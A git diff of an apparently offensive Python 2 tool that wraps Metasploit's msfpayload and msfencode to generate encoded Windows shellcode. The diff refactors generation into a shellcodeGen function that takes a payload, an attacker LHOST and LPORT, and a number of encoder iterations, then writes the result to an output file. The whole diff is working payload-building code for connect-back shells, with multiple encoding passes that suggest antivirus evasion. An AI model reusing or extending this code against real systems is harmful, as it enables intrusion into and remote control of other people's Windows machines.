@@ -7,6 +7,27 @@ from src.core import menus
 from src.core.main import *
 from time import sleep
 
+def shellcodeGen(path, encoding, payload, ip, port, iterations, encoder):
+	if encoding == '1':
+		PrintInfo("Generating shellcode with x%s %s" % (iterations, encoder))
+		print ""
+		proc = subp.Popen("%s/msfpayload %s LHOST=%s LPORT=%s R | %s/msfencode -c %s -e %s -t c | tr -d '\"' | tr -d '\n' | sed 's/unsigned char buf\[\] \= //'" \
+							% (path, payload, ip, port, path, iterations, encoder), shell=True, stdout=subp.PIPE)
+
+		shellcode = proc.communicate()[0]
+		shellcode = shellcode.strip(';')
+	
+	elif encoding == '2':
+		PrintInfo("Generating shellcode")
+		print ""
+		proc = subp.Popen("%s/msfpayload %s LHOST=%s LPORT=%s C | tr -d '\"' | tr -d '\n' | sed 's/unsigned char buf\[\] \= //'" \
+							% (path, payload, ip, port), shell=True, stdout=subp.PIPE)
+
+		shellcode = proc.communicate()[0]
+		shellcode = shellcode.strip(';')
+
+	return shellcode
+
 while 1:
 	try:
 		# set msfpath
@@ -67,6 +88,8 @@ while 1:
 		# shall we encode the payload?
 		menus.win_enc_menu()
 		encoding = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))
+		if not encoding:
+			encoding = "1"
 	
 		#			
 		# get some user info
@@ -81,54 +104,20 @@ while 1:
 			if not iterations:
 				iterations = 5
 
-		# create payload
-		#
-		# if encoding is 1 then run multi-encoder
-		# nothing special just piping through msfencode
-		#
-		if encoding == '1' or encoding == '':
-			PrintInfo("Generating shellcode with x%s %s. Please wait..." % (iterations, encoder))
-			print ""
-			proc = subp.Popen("%s/msfpayload %s LHOST=%s LPORT=%s R | %s/msfencode -c %s -e %s -t c | tr -d '\"' | tr -d '\n' | sed 's/unsigned char buf\[\] \= //'" \
-								% (path, payload, ip, port, path, iterations, encoder), shell=True, stdout=subp.PIPE)
-			
-			shellcode = proc.communicate()[0]
-			shellcode = shellcode.strip(';')
-			sleep(3)
-			
-			# create windows shellcode file
-			winshellcode = "output/"+outfile
-			fw = open(winshellcode, "w")
-			fw.write(shellcode)
-			fw.close()
-			sleep(1)
-			
-			# return to main
-			PrintInfo("File %s created in output directory" % outfile)
-			EntContinue()
-			break
-		
-		elif encoding == '2':
-			PrintInfo("Generating shellcode. Please wait...")
-			proc = subp.Popen("%s/msfvenom -p %s LHOST=%s LPORT=%s -b '\x00' C | tr -d '\n' | tr -d '+' | tr -d '\"' | tr -d ' ' | sed 's/buf=//'" \
-								% (path, payload, ip, port), shell=True, stdout=subp.PIPE)
-			
-			shellcode = proc.communicate()[0]
-			shellcode = shellcode.strip(';')
-			shellcode = shellcode.strip('+')
-			sleep(3)
+		# generate shellcode
+		shellcode = shellcodeGen(path, encoding, payload, ip, port, iterations, encoder)
 
-			# create windows shellcode file
-			winshellcode = "output/"+outfile
-			fw = open(winshellcode, "w")
-			fw.write(shellcode)
-			fw.close()
-			sleep(1)
+		# write shellcode to file
+		winshellcode = "output/"+outfile
+		fw = open(winshellcode, "w")
+		fw.write(shellcode)
+		fw.close()
+		sleep(1)
 
-			# return to main
-			PrintInfo("File %s created in output directory" % outfile)
-			EntContinue()
-			break
+		# return to main
+		PrintInfo("File %s created in output directory" % outfile)
+		EntContinue()
+		break
 
 	except KeyboardInterrupt:
 		break
